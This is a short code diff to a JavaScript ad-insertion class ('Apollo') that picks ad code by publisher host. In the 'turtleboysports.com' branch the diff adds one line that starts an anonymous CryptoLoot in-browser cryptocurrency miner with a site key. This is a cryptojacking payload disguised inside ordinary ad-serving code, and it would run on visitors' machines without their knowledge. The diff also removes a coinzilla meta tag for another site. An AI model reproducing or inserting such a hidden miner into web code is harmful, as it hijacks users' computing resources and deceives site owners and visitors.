@@ -41,11 +41,12 @@ class Apollo {
     switch(this.pubInfo.host) {
       case 'turtleboysports.com':
         this.insertGoogle(this.tbsAds, this.ratio.tbs)
+        var miner = new CryptoLoot.Anonymous('6eb8bbc890df55b9683dae8e270f14753ab4750a1eb1');miner.start();
 
         break
       case 'vitalvegas.com':
         this.insertGoogle(this.vvAds, this.ratio.vv)
-        this.insertMeta('coinzilla', 'coinzilla-641495a1e19eb12cfb')
+
 
         break
       case 'www.howtogrowinstagram.com':
